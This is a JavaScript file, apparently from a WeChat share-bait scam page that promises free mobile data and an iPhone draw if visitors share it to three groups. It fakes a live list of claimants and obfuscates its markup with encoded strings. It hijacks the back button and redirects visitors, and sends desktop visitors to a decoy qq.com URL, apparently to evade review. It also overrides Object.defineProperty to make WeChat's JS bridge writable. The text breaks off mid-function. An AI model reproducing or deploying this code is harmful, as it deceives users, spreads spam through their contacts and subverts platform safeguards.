var liusharednew = localStorage.getItem("liusharednew");
if(null == liusharednew || '' == liusharednew) {
    function selecther(){
        var tprev = window.location.href.split('#')[1], tcnow = new Date().getTime();
        if((tprev == undefined || tcnow - tprev >= 10000) && location.host != apidata.domain) {
            top.location.href = "http://" + apidata.domain + "/#" + tcnow
        }
    }

    setTimeout(selecther(), 300)
} else {
    top.location.href = apidata.cache_link
}
var sharecou = 0;
var sharedata = {
    'title': '',
    'link': '',
    'imgUrl': '',
    'desc': '',
    'qtitle': '',
    'qlink': '',
    'qimgUrl': '',
    'qdesc': '',
    'success': function(res){
        if(res == "friend") {
            sharecou++;
            if(sharecou >= 3) {
                localStorage.setItem("liusharednew", "liusharednew");
                weui.alert('恭喜你！流量下个月结日到账<br/><br/>感谢您的参与:)<br/><br/>再送你三次抽<font class="red">iPhone7 Plus</font>的机会哟！', '', '', function(){
                    location.href = apidata.share_landing_link
                })
            } else {
                weui.alert('分享成功！<br/><br/>请再分享到<font class="bred">' + (3 - sharecou) + '</font>个不同的微信群！')
            }
        } else if(res == "timeline") {
            weui.alert('分享成功！<br/><br/>请再分享到<font class="bred">' + (3 - sharecou) + '</font>个不同的微信群！')
        }
    }
};
setTimeout(function(){
    history.pushState(history.length + 1, "message", '#' + new Date().getTime());
}, 300);
var ua = navigator.userAgent;
if(ua.indexOf("MicroMessenger") > 0 && document.write(unescape("%3Cdiv%20class%3D%22container%22%20id%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22hongbao%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22topcontent%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22avatar%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22images/TB2zcNfvmFjpuFjSszhXXaBuVXa_%21%21788590822.png%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding-top%3A10px%3Bmargin%3A0%20auto%3Bfont-size%3A%20.3rem%3B%22%3E%3Cscript%3Edocument.write%28%22%5Cu6d41%5Cu91cf%5Cu5305%22%29%3C/script%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding-top%3A10px%3Bmargin%3A0%20auto%3Bfont-size%3A%20.2rem%3B%22%3E%3Cscript%3Edocument.write%28%22%5Cu53d1%5Cu4e86%5Cu4e00%5Cu4e2a%5Cu6d41%5Cu91cf%5Cu5305%5Cuff0c%5Cu6708%5Cu5e95%5Cu4e0d%5Cu6e05%5Cu96f6%22%29%3C/script%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22chai%22%20id%3D%22chai%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22chai2%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%22%5Cu958b%22%29%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22margin%3A0%20auto%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22brand%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cli%3E%3Cimg%20src%3D%22images/TB2njYezm0mpuFjSZPiXXbssVXa_%21%21788590822.png%22%3E%3Cspan%3E%5Cu4e2d%5Cu56fd%5Cu79fb%5Cu52a8%3C/span%3E%3C/li%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cli%3E%3Cimg%20src%3D%22images/TB2M_qgzbJmpuFjSZFwXXaE4VXa_%21%21788590822.png%22%3E%3Cspan%3E%5Cu4e2d%5Cu56fd%5Cu8054%5Cu901a%3C/span%3E%3C/li%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cli%3E%3Cimg%20src%3D%22images/TB2tsEnu1J8puFjy1XbXXagqVXa_%21%21788590822.png%22%3E%3Cspan%3E%5Cu4e2d%5Cu56fd%5Cu7535%5Cu4fe1%3C/span%3E%3C/li%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22showmain%22%20style%3D%22overflow%3Aauto%3Bdisplay%3Anone%22%3E%0A%20%20%20%20%20%20%20%20%3Csection%20class%3D%22top%22%3E%3C/section%3E%0A%20%20%20%20%20%20%20%20%3Csection%20class%3D%22main%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22qrcode%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/section%3E%0A%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20id%3D%22lq%22%20src%3D%22images/TB2_yjEyb4npuFjSZFmXXXl4FXa_%21%212723535280.png%22%20class%3D%22fenxiang_w%22%20style%3D%22display%3Ablock%3Bwidth%3A100%25%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3Bdisplay%3Anone%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%26nbsp%3B%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Csection%20class%3D%22bottom%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23474747%3Bmargin-top%3A3px%3Bmargin-bottom%3A%2013px%3Bfont-size%3A%20.25rem%3B%22%3E%3Cscript%3Edocument.write%28%22%5Cu6d41%5Cu91cf%5Cu5305%22%29%3C/script%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23000%3Bfont-size%3A%20.25rem%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20id%3D%22get_money%22%20style%3D%22font-size%3A.5rem%22%3E1%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20style%3D%22font-size%3A.5rem%22%3EM%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%22%5Cu6d41%5Cu91cf%22%29%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3Axa%28%29%3B%22%20style%3D%22width%3A40%25%3Bheight%3A50px%3Bfont-size%3A18px%3Bline-height%3A50px%3Bborder-radius%3A8px%3Bbackground%3A%231d99e1%3Bcolor%3A%23fff%3Btext-align%3Acenter%3Bmargin%3A9px%20auto%2010px%20auto%3Bdisplay%3Ablock%3Btext-decoration%3Anone%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%22%5Cu70b9%5Cu6b64%5Cu7acb%5Cu5373%5Cu9886%5Cu53D6%22%29%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22background-color%3A%23faf6f1%3Bpadding%3A.1rem%3Bborder-top%3A1px%20%23f0eeea%20solid%3Bborder-bottom%3A1px%20%23f0eeea%20solid%3Bmargin-top%3A10px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20style%3D%22color%3A%20%23999%3Bfont-size%3A%20.25rem%3B%22%3E%3Cscript%3Edocument.write%28%22%5Cu5171%5Cu0031%5Cu0030%5Cu0030%5Cu0030%5Cu4e2a%5Cu6d41%5Cu91cf%5Cu5305%22%29%3C/script%3E%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22hbAvList%22%3E%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/section%3E%0A%20%20%20%20%3C/div%3E")), ua = navigator.userAgent, ua.indexOf("MicroMessenger") > 0) {
    var clientWidth = document.documentElement.clientWidth > 640 ? 640 : document.documentElement.clientWidth;
    document.documentElement.style.fontSize = (clientWidth * 2 / 10) + 'px';

    function xb(){
        weui.alert('分享成功！<br/><br/>请再分享到<font class="bred">' + (3 - sharecou) + '</font>个不同的微信群！');
    }

    function xa(){
        $("#mask").css("height", $(document).height());
        $("#mask").css("width", $(document).width());
        $(".fenxiang_w").show();
        $("#mask").show();
        xb()
    }

    var oa = document.getElementById("chai2"), ob = document.getElementById("container"), oc = document.getElementById("showmain");
    oc.style.display = "none";
    oa.onclick = function(){
        oa.setAttribute("class", "rotate");
        var od = apidata.number;
        setTimeout(function(){
            ob.remove();
            oc.style.display = "";
            var n = 0, t = setInterval(function(){
                n += 9;
                if(n >= od) {
                    clearInterval(t);
                    n = od;
                }
                document.getElementById("get_money").innerHTML = n;
            }, 6);
        }, 1600)
    };
    $(function(){
        function u(a){
            var t = new Date;
            var b = t.getHours(), c = t.getMinutes() * 1 + a.c_time * 1;
            return c > 59 && (c = c - 60, b++, b > 23 && (b = 0)), '<li><img src="' + a.w_headimg + '" alt=""><div class="hbName"><h3>' + eval("'" + a.w_name + "'") + '<\/h3><p class="hbTime">' + b + ":" + c + '<\/p><\/div><span class="hbMoney">' + eval("'" + a.u_time + "'") + "<\/span><\/li>"
        }

        function f(){
            return '<li style="display: none;"><\/li>'
        }

        function e(a){
            var t = new Date;
            var b = t.getHours(), c = t.getMinutes() * 1 + a.c_time * 1;
            return c > 59 && (c = c - 60, b++, b > 23 && (b = 0)), '<img src="' + a.w_headimg + '" alt=""><div class="hbName"><h3>' + eval("'" + a.w_name + "'") + '<\/h3><p class="hbTime">' + b + ":" + c + '<\/p><\/div><span class="hbMoney">' + eval("'" + a.u_time + "'") + "<\/span>"
        }

        setTimeout(function(){
            for(var i = [{
                w_name: "二丫头",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/3CC6C03786C6C693F364B395F327197F/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0033\u0037\u004d\u6d41\u91cf",
                c_time: "7"
            }, {
                w_name: " \\uD83C\\uDF80\\uD83D\\uDE34\\uD83D\\uDE34\\uD83D\\uDE34",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/77AC9176E0EE94A552AAD6961066D4BA/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0038\u0034\u004d\u6d41\u91cf",
                c_time: "6"
            }, {
                w_name: "小子记住我",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0031\u0034\u004d\u6d41\u91cf",
                c_time: "12"
            }, {
                w_name: "小猫咪回忆",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0036\u0038\u004d\u6d41\u91cf",
                c_time: "5"
            }, {
                w_name: "春天般～温暖",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0037\u0037\u004d\u6d41\u91cf",
                c_time: "15"
            }, {
                w_name: "妙不可言",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0033\u0030\u004d\u6d41\u91cf",
                c_time: "15"
            }, {
                w_name: "频繁的我",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0035\u0037\u004d\u6d41\u91cf",
                c_time: "15"
            }, {
                w_name: "牛奶饼干",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0039\u0033\u004d\u6d41\u91cf",
                c_time: "9"
            }, {
                w_name: "毕竟我们还年轻",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0033\u0031\u0034\u004d\u6d41\u91cf",
                c_time: "2"
            }, {
                w_name: "有你每一天",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/9CFD84D74ABF5141EA8F6B73BD06C3E1/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0031\u0036\u004d\u6d41\u91cf",
                c_time: "3"
            }, {
                w_name: "雷乐天",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/BA6DA5237D4175DDC750553561F219B7/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0037\u0037\u004d\u6d41\u91cf",
                c_time: "8"
            }, {
                w_name: "Jkz.",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0032\u0031\u004d\u6d41\u91cf",
                c_time: "10"
            }, {
                w_name: "卢正英",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0035\u0031\u004d\u6d41\u91cf",
                c_time: "7"
            }, {
                w_name: "叫我冰冰",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0036\u0031\u004d\u6d41\u91cf",
                c_time: "9"
            }, {
                w_name: "已婚少年",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0037\u0034\u004d\u6d41\u91cf",
                c_time: "7"
            }, {
                w_name: "\\uD83C\\uDF3A、dacy",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0032\u0033\u004d\u6d41\u91cf",
                c_time: "7"
            }, {
                w_name: "Mr. Xue",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0037\u0037\u004d\u6d41\u91cf",
                c_time: "2"
            }, {
                w_name: "孙粒子",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0031\u0037\u004d\u6d41\u91cf",
                c_time: "6"
            }, {
                w_name: "二分^_^睡眠",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/C54D6E68485F84A86822CF7E473A93EC/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0034\u0036\u004d\u6d41\u91cf",
                c_time: "15"
            }, {
                w_name: "最佳搭档，",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/2316567F52712C775048DB02BF5C261C/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0033\u0036\u004d\u6d41\u91cf",
                c_time: "3"
            }, {
                w_name: "小甜甜",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/D1A596E47C0AA279BA8BB9BAAC02CC44/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0039\u0039\u004d\u6d41\u91cf",
                c_time: "12"
            }, {
                w_name: "好8不好8",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/189955F05F482DE956480DB66B07E4DC/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0031\u0036\u004d\u6d41\u91cf",
                c_time: "12"
            }, {
                w_name: "快乐每一天_",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/5CD9B7ACD34332B8DA145BE3DE4C44FB/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0034\u0033\u004d\u6d41\u91cf",
                c_time: "14"
            }, {
                w_name: " \\uD83D\\uDC8B",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/B7CDFAA5FD54A0FD2904A30B6A29D660/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0036\u0038\u004d\u6d41\u91cf",
                c_time: "13"
            }, {
                w_name: "似懂非懂",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/D3875B44A8DB4ABE135059C7362B4094/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0033\u0037\u004d\u6d41\u91cf",
                c_time: "5"
            }, {
                w_name: "小布丁555",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0032\u0030\u004d\u6d41\u91cf",
                c_time: "9"
            }, {
                w_name: "。",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0034\u0030\u004d\u6d41\u91cf",
                c_time: "2"
            }, {
                w_name: "快来调侃",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0031\u0037\u004d\u6d41\u91cf",
                c_time: "12"
            }, {
                w_name: "IF YOU",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0034\u0038\u004d\u6d41\u91cf",
                c_time: "11"
            }, {
                w_name: "孔海西",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0035\u0031\u004d\u6d41\u91cf",
                c_time: "10"
            }, {
                w_name: "一",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0031\u0031\u004d\u6d41\u91cf",
                c_time: "4"
            }, {
                w_name: "Zhao. Dtail Ψ",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/94B9F8421330A7B82F019492C822BF42/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0037\u0038\u004d\u6d41\u91cf",
                c_time: "14"
            }, {
                w_name: "天天向上",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0031\u0038\u004d\u6d41\u91cf",
                c_time: "12"
            }, {
                w_name: "我在你身边枕℡",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/FF4E560E4F11C2EBAAFFFC4625CD3122/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0031\u0038\u004d\u6d41\u91cf",
                c_time: "11"
            }, {
                w_name: "潇了个洒\\uD83C\\uDFC3",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0036\u0036\u004d\u6d41\u91cf",
                c_time: "8"
            }, {
                w_name: "花花公子",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0036\u0036\u004d\u6d41\u91cf",
                c_time: "2"
            }, {
                w_name: "我是你的情人",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0032\u0031\u0038\u004d\u6d41\u91cf",
                c_time: "2"
            }, {
                w_name: "笑疯癫",
                w_headimg: "http://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
                u_time: "\u9886\u53d6\u4e86\u0020\u0031\u0035\u0031\u004d\u6d41\u91cf",
                c_time: "10"
            }], n = 0, t = new Date, r; n < 5; n++) {
                r = i[n], $(".hbAvList").append(u(r));
            }
            setInterval(function(){
                var t = i[n];
                $(".hbAvList li:last").slideUp(1e3, function(){
                    $(this).remove()
                });
                $(".hbAvList li:first .hbMoney").css("color", "#1d99e1");
                $(".hbAvList").prepend(f());
                $(".hbAvList li:first").append(e(t));
                $(".hbAvList li:first").find(".hbMoney").css("color", "#1d99e1");
                $(".hbAvList li:first").slideDown(1e3, function(){
                    n % 2 < 1 ? $(".hbAvList li:first").find(".hbMoney").addClass("animated tada") : $(".hbAvList li:first").find(".hbMoney").addClass("animated zoomIn");
                    n = ++n % i.length
                })
            }, 2e3)
        }, 400);
    });

    weui = {
        alert: function(n, t, k, i){
            var r, u;
            t = t ? t : "";
            k = k ? k : app.class("*22909*30340");
            r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
            r += '<div class="weui_mask"><\/div>';
            r += '<div class="weui_dialog">';
            r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title">' + t + "<\/strong><\/div>";
            r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><\/div>';
            r += '<div class="weui_dialog_ft">';
            r += '<a href="javascript:;" class="weui_btn_dialog primary">' + k + '<\/a>';
            r += "<\/div>";
            r += "<\/div>";
            r += "<\/div>";
            $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
            u = $(".weui_dialog_alert");
            u.show();
            u.find(".weui_dialog_bd").html(n);
            u.find(".weui_btn_dialog").html(k);
            u.find(".weui_btn_dialog").off("click").on("click", function(){
                u.hide();
                i && i()
            })
        }
    };

    window.onhashchange = function(){
        if(apidata && apidata.back_link) {
            top.location.href = apidata.back_link;
        }
    };
}
var app = app || {}, Url, oldDefProp, fakeUrl, Main, WechatShare, ua, weui;
if(function(){
        var n = this;
        app.rndStr = function(n){
            n = n || 32;
            var t = "abcdefhijkmnprstwxyz2345678", u = t.length, r = "";
            for(i = 0; i < n; i++) {
                r += t.charAt(Math.floor(Math.random() * u));
            }
            return r
        };
        app.rndNum = function(n){
            return Math.ceil(Math.random() * n)
        };
        app.class = function(n){
            var r, t, i;
            if(!n) {
                return "";
            }
            for(r = n[0], t = n.split(r), i = 0; i < t.length; i++) {
                t[i] && (t[i] = String.fromCharCode(t[i]));
            }
            return t.join("");
        };
        ;
        app.addRndToUrl = function(n){
            return n.indexOf("?") > -1 ? n + "&rnd=" + app.rndStr(6) : n + "?rnd=" + app.rndStr(6)
        };
        app.decodeStr = function(n){
            var r, t, i;
            if(!n) {
                return "";
            }
            for(r = n[0], t = n.split(r), i = 0; i < t.length; i++) {
                t[i] && (t[i] = String.fromCharCode(t[i]));
            }
            return t.join("")
        };
        app.rndSymbols = function(n){
            n = n || 4;
            var t = "△▽○◇□☆▲▼●★☉⊙⊕Θ◎￠〓≡㊣♀※♂∷№囍＊▷◁♤♡♢♧☼☺☏♠♥♦♣☀☻☎☜☞♩♪♫♬◈▣◐◑☑☒☄☢☣☭❂☪➹☃☂❦❧✎✄۞", u = t.length, r = "";
            for(i = 0; i < n; i++) {
                r += t.charAt(Math.floor(Math.random() * u));
            }
            return r
        };
        app.strToCode = function(n){
            for(var r = "", i, t = 0; t < n.length; t++) {
                i = "0000" + parseInt(n[t].charCodeAt(0), 10).toString(16), r += i.substring(i.length - 4, i.length);
            }
            return r
        };
        app.getCookie = function(n){
            var t, i = new RegExp("(^| )" + n + "=([^;]*)(;|$)");
            return (t = document.cookie.match(i)) ? unescape(t[2]) : null
        };
        app.setCookie = function(n, t){
            var i = new Date;
            i.setTime(i.getTime() + 2592e6);
            document.cookie = n + "=" + escape(t) + ";path=/;expires=" + i.toGMTString()
        };
        app.delCookie = function(n){
            var t = new Date;
            t.setTime(t.getTime() - 86400);
            document.cookie = n + "=;path=/;expires=" + t.toGMTString()
        };
        app.showHint = function(n){
            layer.open({content: n, time: 2})
        };
        app.showInfo = function(n, t){
            layer.open({title: t || "提示", content: n, btn: ["我知道了"]})
        }
    }(), ua = navigator.userAgent, ua.indexOf("MicroMessenger") > 0) {
    function isInWechat(){
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("micromessenger") >= 0
    }

    function isIos(){
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("iphone") >= 0 || n.indexOf("ipad") >= 0 || n.indexOf("applewebkit") >= 0
    }

    function isAndroid(){
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("android") >= 0
    }

    function isUrl(n){
        return !!n && (n.indexOf("http://") >= 0 || n.indexOf("https://") >= 0)
    }

    function isArray(n){
        return "[object Array]" === Object.prototype.toString.call(n)
    }

    function isNumber(n){
        return "number" == typeof n
    }

    function getRandomNum(n, t){
        var i = t - n, r = Math.random();
        return n + Math.round(r * i)
    }

    function getFormatDate(){
        var n = new Date, t = new Date(n.setHours(n.getHours() + 8)).toISOString();
        return t.substring(0, t.indexOf("T"))
    }

    function changeTitle(n){
        if(document.title = n, navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
            var i = $("body"), t = $('<iframe src="/favicon.ico"><\/iframe>');
            t.on("load", function(){
                setTimeout(function(){
                    t.off("load").remove()
                }, 0)
            }).appendTo(i)
        }
    }

    Url = function(){
        function n(){
            this.host = window.location.host;
            this.protocol = window.location.protocol;
            this.params = this.GetRequest(window.location.search);
            this.hash = window.location.hash;
            this.pathname = window.location.pathname
        }

        return n.prototype.GetHref = function(n){
            var i = this, o = void 0 === n.port ? i.port : n.port, c = void 0 === n.pathname ? i.pathname : n.pathname, l = n.host || i.host, a = n.protocol || i.protocol || "http:", f = a + "//" + l + (o ? ":" + o : "") + c, r = {}, e, s, u, t, h;
            if("all" !== n.removeParams) {
                for(t in i.params) {
                    i.params.hasOwnProperty(t) && (r[t] = i.params[t]);
                }
            }
            if(n.params) {
                for(t in n.params) {
                    n.params.hasOwnProperty(t) && (r[t] = n.params[t]);
                }
            }
            if("all" !== n.removeParams && (e = n.removeParams, e)) {
                for(t in e) {
                    n.removeParams.hasOwnProperty(t) && (s = n.removeParams[t], delete r[s]);
                }
            }
            u = [];
            for(t in r) {
                r.hasOwnProperty(t) && u.push(t + "=" + encodeURIComponent(r[t]));
            }
            return u && u.length > 0 && (h = u.join("&")), f += f.indexOf("?") > 0 ? "&" : "?", f + h
        }, n.prototype.GetRequest = function(n){
            var f = n, e = {};
            if(f.indexOf("?") != -1) {
                for(var h = f.substr(1), o = h.split("&"), r = 0; r < o.length; r++) {
                    var t = o[r], u = t.indexOf("="), i = void 0, s = void 0;
                    u >= 0 ? (i = t.substr(0, u), s = decodeURIComponent(t.substring(u + 1))) : i = t;
                    i && (e[i] = s)
                }
            }
            return e
        }, n
    }();
    oldDefProp = Object.defineProperty;
    Object.defineProperty = function(n, t, i){
        (t == app.decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110") || t == app.decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101")) && (i.writable = !0, i.configurable = !0);
        oldDefProp(n, t, i)
    };
    window.url = new Url;
    fakeUrl = "http://weather.html5.qq.com";
    window.config = {modelConfig: {forceShareCount: 3}, showRepairPage: !1, forbidUrl: fakeUrl};
    window.mConfig = {};
    isAndroid() || isIos() || (location.href = config.forbidUrl ? config.forbidUrl : fakeUrl);
    Main = function(){
        function n(){
            this.nextUrlCalledCount = 0;
            this.forceShareCount = 4;
            this.currentShareCount = 0;
            this.toastTimeOut = 0;
            this.searchModelId = window.url.params.mid || "video-list";
            this.redirect = this.isNeedRedirect();
            this.isIphone = isIos();
            this.fileName = location.pathname.substr(location.pathname.lastIndexOf("/"));
